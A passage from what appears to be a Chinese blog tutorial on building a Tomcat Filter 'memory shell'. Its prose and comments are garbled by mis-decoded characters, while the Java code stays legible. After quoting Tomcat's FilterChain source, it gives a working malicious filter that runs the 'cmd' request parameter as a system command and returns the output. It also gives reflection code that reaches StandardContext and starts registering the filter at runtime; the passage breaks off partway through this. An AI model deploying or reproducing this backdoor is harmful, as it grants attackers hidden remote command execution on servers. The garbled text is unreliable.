</span></span><span class="line"><span class="cl">        <span class="c1">// 7. Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">filterChain</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Âú®Áü•ÈÅì‰∫Ü‰∏∫‰∏Ä‰∏™ËØ∑Ê±ÇÁöÑÂ§ÑÁêÜÊâÄÊûÑÈÄ†FilterChainÁöÑËøáÁ®ã‰πãÂêéÔºåÊàë‰ª¨Êù•ÈáçÁÇπÂÖ≥Ê≥®Â∞ÜFilterÂä†ÂÖ•FilterChainÁöÑËøáÁ®ãÔºå‰ªé‰∏≠Êàë‰ª¨ÂæóÂà∞ÁöÑ‰ø°ÊÅØÊòØÔºö <!-- raw HTML omitted --></p>
<ol>
<li>‰∏Ä‰∏™FilterÊòØÂê¶‰ºöÂä†ÂÖ•Êú¨Ê¨°ÁöÑFilterChainÁöÑÂà§Êñ≠Ê†áÂáÜÂ∞±ÊòØÔºåÂÖ∂‰øùÂ≠òÁöÑFilterMapÔºà&lt;filter-mapping&gt;ÔºâÊ†áÁ≠æ‰ø°ÊÅØÔºåÊòØÂê¶Êª°Ë∂≥Ôºö <!-- raw HTML omitted -->
<ul>
<li>ËØ∑Ê±ÇÊâÄÂØπÂ∫îÁöÑURL‰ø°ÊÅØÔºõ <!-- raw HTML omitted --></li>
<li>ËØ∑Ê±ÇÊâÄÂØπÂ∫îÁöÑServletÔºõ <!-- raw HTML omitted --></li>
</ul>
</li>
<li>Âú®Á°ÆÂÆö‰∫ÜË¶ÅÂä†ÂÖ•ÁöÑFilter‰πãÂêéÔºåÈúÄË¶ÅÊ†πÊçÆÂú®TomcatÂêØÂä®Èò∂ÊÆµÂàùÂßãÂåñFilterÊâÄÂ∞ÅË£ÖÊàêFilterConfigÂØπË±°Âä†ÂÖ•Êú¨Ê¨°ËØ∑Ê±ÇÂ§ÑÁêÜÁöÑFilterChainÂΩì‰∏≠Âç≥ÂèØÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 4. Ê†πÊçÆËØ∑Ê±ÇÁöÑURLË∑ØÂæÑÂà§Êñ≠ÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersURL</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">requestPath</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 5. Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Add filters that match on servlet name second
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 6. Ê†πÊçÆweb.xmlÈÖçÁΩÆÊñá‰ª∂‰∏≠Ôºå&lt;filter-map&gt;Ê†áÁ≠æ‰∏≠ÁöÑÂ≠êÊ†áÁ≠æ&lt;servlet-name&gt;,Âä†ËΩΩÂì™‰∫õ‰∏ìÈó®‰∏∫ÁâπÂÆöServletÊúçÂä°ÁöÑfilterÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersServlet</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">servletName</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 7. Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>FilterChain‰πãÂêé‰ºöË∞ÉÁî®ÂÖ∂doFilter()ÊñπÊ≥ïÔºå‰æùÊ¨°Ë∞ÉÁî®ÂÜÖÁΩÆÁöÑFilterÁöÑdoFilter()ÊñπÊ≥ïÊù•ËøáÊª§ËØ∑Ê±ÇÔºåÊúÄÁªà‰º†ÈÄíÁªôServletÁöÑservice()ÊñπÊ≥ïËøõË°åËØ∑Ê±ÇÁöÑÂ§ÑÁêÜÔºö <!-- raw HTML omitted --></p>
<ol>
<li>FilterChain#doFilterË∞ÉÁî®FilterChain#internalDoFilter; <!-- raw HTML omitted --></li>
<li>Ê†πÊçÆfilterConfigÊù•Ëé∑ÂèñfilterÂØπË±°; <!-- raw HTML omitted --></li>
<li>Ë∞ÉÁî®filterÊú¨Ë∫´ÁöÑdoFilterÊñπÊ≥ïÔºåËøáÊª§Êìç‰ΩúÁªìÊùü‰πãÂêéÂÜç‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™filter; <!-- raw HTML omitted --></li>
<li>ÊâÄÊúâÁöÑfilterÈÉΩdoFilterÊìç‰Ωú‰πãÂêéÔºåÂ∞±‰ºöÊâßË°åÂØπÂ∫îÁöÑservletÁöÑservice()ÊñπÊ≥ïÊ≠£ÂºèÊé•ÁÆ°Â§ÑÁêÜrequest; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Ë∞ÉÁî®internalDoFilter()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">ServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">ServletResponse</span> <span class="n">res</span> <span class="o">=</span> <span class="n">response</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedExceptionAction</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">public</span> <span class="n">Void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">ApplicationFilterChain</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">internalDoFilter</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="n">res</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">internalDoFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">internalDoFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">n</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">filters</span><span class="o">[</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span><span class="o">++];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 1. Ê†πÊçÆfilterConfigÊù•Ëé∑ÂèñfilterÂØπË±°;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">filterConfig</span><span class="o">.</span><span class="na">getFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. Ë∞ÉÁî®filterÊú¨Ë∫´ÁöÑdoFilterÊñπÊ≥ïÔºåËøáÊª§Êìç‰ΩúÁªìÊùü‰πãÂêéÂÜç‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™filter;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filter</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">....</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">HttpServletRequest</span> <span class="o">&amp;&amp;</span> <span class="n">response</span> <span class="k">instanceof</span> <span class="n">HttpServletResponse</span> <span class="o">&amp;&amp;</span> <span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 3. ÊâÄÊúâÁöÑfilterÈÉΩdoFilterÊìç‰Ωú‰πãÂêéÔºåÂ∞±‰ºöÊâßË°åÂØπÂ∫îÁöÑservletÁöÑservice()ÊñπÊ≥ïÊ≠£ÂºèÊé•ÁÆ°Â§ÑÁêÜrequest;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">service</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h3 id="filterÂÜÖÂ≠òÈ©¨ÁöÑÊûÑÈÄ†">FilterÂÜÖÂ≠òÈ©¨ÁöÑÊûÑÈÄ†</h3>
<p>Êàë‰ª¨Âú®‰∏ä‰∏ÄÂ∞èËäÇ‰∏≠‰ªãÁªç‰∫ÜÈíàÂØπÊØè‰∏ÄÊ¨°ÂÆ¢Êà∑Á´ØÂèëÊù•ÁöÑËØ∑Ê±ÇÔºåTomcatÊòØÂ¶Ç‰ΩïÊûÑÈÄ†FiltetrChainÁöÑÔºåÂêåÊó∂‰πüÁúãÂà∞‰∫ÜTomcatÊòØÂ¶Ç‰ΩïÊåëÈÄâÈúÄË¶ÅÂä†ÂÖ•Filter ChainÁöÑFilterÁöÑÔºåËøôÈáåÊúâÂá†‰∏™ÈáçË¶ÅÁöÑÊàêÂëòÂèòÈáèÔºö <!-- raw HTML omitted --></p>
<ol>
<li>filterMaps: Â≠òÂÇ®FilterMapÁöÑ‰ø°ÊÅØÔºåÁî®Êù•Âà§Êñ≠ÊòØÂê¶‰∏∫Êú¨Ê¨°FilterChainÊûÑÈÄ†ÊâÄÈúÄÁöÑFilterÔºõ <!-- raw HTML omitted --></li>
<li>filterConfig: Áî®Êù•Â∞ÅË£ÖFilterÂÆû‰æãÔºå‰ªéËÄåÊ∑ªÂä†Âà∞FilterChain‰∏≠Ôºõ <!-- raw HTML omitted --></li>
</ol>
<p>Êàë‰ª¨‰πãÂâçÊúâÊèêÂà∞ÔºåFilterÂÜÖÂ≠òÈ©¨Â∞±ÊòØË¶ÅÊûÑÂª∫‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑÔºåÂ∏¶ÊúâÊÅ∂ÊÑè‰ª£Á†ÅÁöÑFilterÁ±ªÔºåÂπ∂Â∞ÜËøô‰∏™ÊÅ∂ÊÑèÁöÑFilterÁ±ªÂú®TomcatÁöÑËøêË°åËøáÁ®ã‰∏≠Ë¢´Ê≥®ÂÜåÔºå‰ªéËÄåÂΩìTomcat‰∏ã‰∏ÄÊ¨°Êî∂Âà∞ÂÆ¢Êà∑Á´ØÂèëÊù•ÁöÑHTTPËØ∑Ê±ÇÊó∂ÔºåÂú®ÊûÑÈÄ†FilterChainÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöÂ∞ÜÊàë‰ª¨ÊûÑÈÄ†ÁöÑÊÅ∂ÊÑèFilterÁ±ªÂä†ÂÖ•Ôºå‰ªéËÄåÂú®doFilterÊó∂ÊâßË°åÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></p>
<p>ÈÇ£Êàë‰ª¨ÁöÑÊÉ≥Ê≥ïÂæàÁÆÄÂçïÔºåÂ∞±ÊòØÔºö <!-- raw HTML omitted --></p>
<ol>
<li>ÊãøÂà∞‰∏Ä‰∏™StandardContextÁöÑÂÆû‰æãÔºõ <!-- raw HTML omitted --></li>
<li>ÂêëStandardContextÁöÑÂÆû‰æã‰∏≠ÁöÑfilterMaps‰ª•ÂèäfilterConfigs‰∏§‰∏™HashMapÊ∑ªÂä†Êàë‰ª¨ÊâÄÈúÄË¶ÅÁöÑFilterÂÆû‰æã‰ª•ÂèäÁõ∏ÂÖ≥‰ø°ÊÅØÔºõ <!-- raw HTML omitted -->
<ul>
<li>‰ΩøÂæófilterÂèØ‰ª•Ë¢´ÊåëÈÄâÂä†ÂÖ•Âà∞FilterChainÁöÑÊûÑÈÄ†‰∏≠Ôºõ <!-- raw HTML omitted --></li>
<li>ÊúÄÂêéfilterÂÆû‰æãÂ∞±ÂèØ‰ª•Âú®doFilter‰∏≠ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å‰∫ÜÔºõ <!-- raw HTML omitted --></li>
</ul>
</li>
</ol>
<p>Ê†πÊçÆËøô‰∏™ÊÄùË∑ØÊàë‰ª¨Êù•ÊûÑÈÄ†‰∏Ä‰∏™Êàë‰ª¨Ëá™Â∑±ÁöÑFilterÂÜÖÂ≠òÈ©¨Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>
<p>Ëá™ÂÆö‰πâ‰∏Ä‰∏™FilterÁ±ªÔºåÂÆûÁé∞FilterÊé•Âè£ÔºåÈáçÂÜô <code>doFilter()</code> ÊñπÊ≥ïÔºåÂÆûÁé∞ÊÅ∂ÊÑè‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellFilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>ÈÄöËøáServletRequestÂÆû‰æãrequest(jsp‰∏≠ÂèØ‰ª•Áõ¥Êé•Ëé∑Âèñ)ÔºåÂà©Áî®ÂèçÂ∞ÑÂæóÂà∞ <code>ApplicationContextFacade</code> Èó®Èù¢Á±ªÁöÑÂÆû‰æãÔºõ <!-- raw HTML omitted --></p>
<ul>
<li>ËøôÈáå‰∏ÄÂÆöË¶Å‰ΩøÁî®ÂèçÂ∞ÑÊòØÂõ†‰∏∫ÊàêÂëòÂèòÈáè <code>context</code> ÊòØÁßÅÊúâÂèòÈáèÔºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//  Ê†πÊçÆrequestËé∑ÂèñApplicationContextFacadeÂÆû‰æãÁ±ª;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ApplicationContextFacade</span> <span class="n">applicationContextFacade</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContextFacade</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Ëé∑ÂèñApplicationContextÂÆû‰æãÁ±ª;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">appContextField</span> <span class="o">=</span> <span class="n">applicationContextFacade</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">appContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContextFacade</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>Êé•ÁùÄÈÄöËøáApplicationContextFacadeÁöÑÂÆû‰æãÁ±ªÂèçÂ∞ÑÂæóÂà∞ <code>StandardContext</code> ÁöÑÂÆû‰æãÔºõ <!-- raw HTML omitted --></p>
<ul>
<li>‰ΩøÁî®ÁöÑÂèçÂ∞ÑÁöÑÂéüÂõ†Âêå‰∏äÔºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Ëé∑ÂèñstandardContextÂÆû‰æã;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">standardContextField</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContextField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">standardContextField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>Êñ∞Âª∫‰∏Ä‰∏™Ëá™ÂÆö‰πâFilterÁöÑÂÆû‰æãÔºåÂπ∂Áî±Ê≠§ÊûÑÈÄ†FilterDefÂÆû‰æãÔºåÂπ∂Ê∑ªÂä†Âà∞standardContextÁöÑ <code>filterDefs</code> ‰∏≠Ôºõ <!-- raw HTML omitted --></p>
<ul>
<li>filterDefÊú¨Ë∫´ÊòØTomatÈÄöËøáËØªÂèñweb.xml‰∏≠ÁöÑ&lt;filter&gt;Ê†áÁ≠æÁöÑ‰ø°ÊÅØÊù•Ëé∑ÂèñÁöÑÔºåËøôÈáåËá™Â∑±ÊûÑÂª∫Â∞±ÈúÄË¶ÅÊâãÂä®ËÆæÁΩÆ‰∏Ä‰∫õÊàêÂëòÂèòÈáèÔºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">MemShellFilter</span> <span class="n">memShellFilter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Â∞ÜFilterÂ∞ÅË£ÖÂà∞FilterDef‰∏≠;
</span></span></span><span class="line"><span class="cl"><span class="c1">// ËøõËÄåÂ∞ÜFilterDefÊ∑ªÂä†Âà∞standardContextÁöÑfilterDefs‰∏≠ÔºåÂ¶ÇÊ≠§ÊâçÂèØ‰ª•Âú®Ê∑ªÂä†filterMapsÊó∂ÈÄöËøáÈ™åËØÅÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">String</span> <span class="n">filterName</span> <span class="o">=</span> <span class="s">&#34;MemShellFilter&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterDef</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilter</span><span class="o">(</span><span class="n">memShellFilter</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">filterName</span><span class="o">);</span>
